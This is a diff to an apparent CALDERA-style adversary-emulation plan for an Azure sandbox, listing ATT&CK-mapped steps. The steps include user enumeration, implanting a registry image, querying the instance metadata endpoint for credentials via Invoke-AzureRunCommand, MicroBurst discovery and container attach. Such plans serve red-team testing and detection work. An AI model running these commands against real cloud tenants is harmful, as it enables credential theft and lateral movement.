@@ -1,4 +1,4 @@
-# APT29.yaml - CALDERA and Atomic style TTPs
+# aep1.yaml - CALDERA and Atomic style TTPs for Cloud Analytics project
 
 - emulation_plan_details:
     id: ffe6f601-5c08-401b-8f80-417a1be8bd97
@@ -18,7 +18,7 @@
   procedure_group: procedure_initial
   procedure_step: "1.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           az container create -g 'ca-sandbox' --name psdocker --image mcr.microsoft.com/powershell:latest --cpu 1 --memory 1
@@ -34,11 +34,11 @@
   tactic: initial-access
   technique:
     attack_id: T1078.004
-    name: Valid Accounts
+    name: "Valid Accounts"
   procedure_group: procedure_access
   procedure_step: "2.A"
   platforms:
-    multi:
+    windows:
       pwsh:
         command: |
           Get-AzureUser -All
@@ -61,11 +61,11 @@
   tactic: Persistence
   technique:
     attack_id: T1525
-    name: Implant Internal Image
+    name: "Implant Internal Image"
   procedure_group: procedure_persist
   procedure_step: "3.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           az acr import -n justsomeregistry --source docker.io/library/hello-world:latest -t targetrepository:targettag
@@ -85,7 +85,7 @@
   procedure_group: procedure_execution
   procedure_step: "4.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           az container create -g 'ca-sandbox' --name psdocker --image justsomeregistry.aurecr.io/targetrepository:targettag --cpu 1 --memory 1
@@ -113,7 +113,7 @@
   procedure_group: procedure_credential
   procedure_step: "5.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           Invoke-AzureRunCommand -VMName ca-linux-vm -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
@@ -140,7 +140,7 @@
   procedure_group: procedure_discovery
   procedure_step: "6.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           Get-AzDomainInfo -folder MicroBurst -Verbose
@@ -168,7 +168,7 @@
   procedure_group: procedure_discovery
   procedure_step: "7.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           Get-AzACR -username "justsomeregistry" -password "xxxxxx" -registry "http://justsomeregistry.azurecr.io"
@@ -196,7 +196,7 @@
   procedure_group: procedure_lateral_movement
   procedure_step: "8.A"
   platforms:
-    multi:
+    windows:
       cmd:
         command: |
           az container attach --name publicapp --resource-group ca-sandbox
